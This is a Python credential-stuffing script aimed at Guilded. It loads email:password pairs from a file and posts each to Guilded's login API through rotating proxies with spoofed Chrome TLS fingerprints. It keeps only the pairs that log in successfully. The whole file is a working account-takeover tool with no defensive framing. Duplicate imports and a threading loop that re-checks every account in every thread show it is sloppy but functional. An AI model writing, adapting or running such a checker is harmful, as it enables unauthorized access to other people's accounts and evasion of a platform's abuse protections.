import tls_client
import random
import concurrent.futures
import tls_client
import random
import colorama
from colorama import Fore, Style, init

def iniciar():
    threads = int(input(Fore.YELLOW + "[" + Fore.RED + ">" + Fore.YELLOW + "] " + Fore.WHITE + "How many threads do u like to use? "))
    with open('realist_accs.txt', 'r') as file:
            accounts = [line.strip().split(':') for line in file if ':' in line]
            total_accounts = len(accounts)
            print(Fore.YELLOW + "[" + Fore.RED + ">" + Fore.YELLOW + "] " + Fore.WHITE + f"Total accounts to check: {total_accounts}")
    def checkacc():
        with open("proxies.txt") as proxies:
            proxy = proxies.readlines()

        valid_accounts = []
        for email, password in accounts:
            random_proxy = random.choice(proxy).strip()
            session = tls_client.Session(
                client_identifier=f"chrome_{random.randint(103, 112)}",
                random_tls_extension_order=True
            )

            session.proxies = {
                "http": "http://" + random_proxy,
                "https": "https://" + random_proxy
            }

            res = session.post(
                f"https://www.guilded.gg/api/login",
                json={
                    "email": email,
                    "getMe": True,
                    "password": password
                }
            )

            if res.status_code == 200:
                print(Fore.YELLOW + "[" + Fore.GREEN + ">" + Fore.YELLOW + "] " + Fore.GREEN + f"Valid account: {email}")
                valid_accounts.append((email, password))
            else:
                print(Fore.YELLOW + "[" + Fore.RED + ">" + Fore.YELLOW + "] " + Fore.RED + f"Invalid account: {email}")

        with open('realist_accs.txt', 'w') as file:
            for email, password in valid_accounts:
                file.write(f"{email}:{password}\n")


    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(checkacc) for _ in range(total_accounts)]
            concurrent.futures.wait(futures)